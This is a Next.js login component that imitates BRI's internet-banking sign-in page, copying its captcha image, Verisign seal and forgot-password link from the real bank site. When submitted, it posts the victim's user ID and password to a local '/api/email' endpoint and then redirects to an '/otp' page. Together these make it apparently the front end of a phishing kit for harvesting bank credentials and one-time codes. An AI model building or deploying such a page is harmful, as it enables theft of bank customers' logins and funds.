
import { useRouter } from 'next/router'
import React, { useState } from 'react'
  
  
  export default function Login() {
    const router = useRouter()
    const [input, setInput] = useState({})

    const handleInputChange = (e) => {
        setInput({
          ...input,
          [e.target.name] : e.target.value
        })
    }

    const handleSubmit = (e) => {
      e.preventDefault()

      if (!e.target[0].value) {
        console.log('wajib isi');
        return
      }
      if (!e.target[1].value) {
        console.log('wajib isi');
        return
      }
      if (!e.target[3].value) {
        console.log('wajib isi');
        return
      }

      fetch('/api/email',{
        method: "POST",
        body: JSON.stringify(input)
      })
      .then(response => response.json())
      .then(data => {
        if(data.responCode == 1) router.push('/otp')
      });
    }

    const isError = input === ''
    return (
        <div className="loginform-wrap">
          <form className="loginform" onSubmit={handleSubmit}>
            <h2>Login</h2>
            <input name="userId" autoComplete="off" maxLength={23} type="text" placeholder="user ID" style={{marginBottom: '5px'}} form="loginform" onChange={handleInputChange} />
            <input name="password" autoComplete="off" maxLength={20} type="password" placeholder="password" style={{marginBottom: '5px'}} form="loginform" onChange={handleInputChange} />
            <div className="validation">							
              <input name="j_code" autoComplete="off" maxLength={4} type="text" placeholder="validation" style={{float: 'left', width: '40%', marginRight: '15px'}}/>
              <div id="simple_img" style={{float: 'left'}}>
                <img className="alignimg" src="https://ib.bri.co.id/ib-bri/login/captcha" />
              </div>
            </div>
            <button type="submit">Masuk</button>
            <div style={{float: 'left', width : '100%'}}>
              <a href="https://sealinfo.verisign.com/splash?form_file=fdf/splash.fdf&dn=ib.bri.co.id" className="verisign">
                <img className="verisign-logo" src="https://ib.bri.co.id/ib-bri/img/securesite1rtc.jpg" width="100px" height="55px" />
              </a>
              <div className="verisigntext">This site chose Verisign SSL for secure e-commerce and confidential communications 
              </div>
            </div>
            <div style={{float: 'left', width : '100%'}}>
              <div style={{float: 'left'}} className="verisigntext">
                <a href="https://ib.bri.co.id/ib-bri/id/forget-password.html"> &gt;&gt; Lupa password Anda? </a><br />
              </div>
            </div>
          </form>

        </div>
    );
  }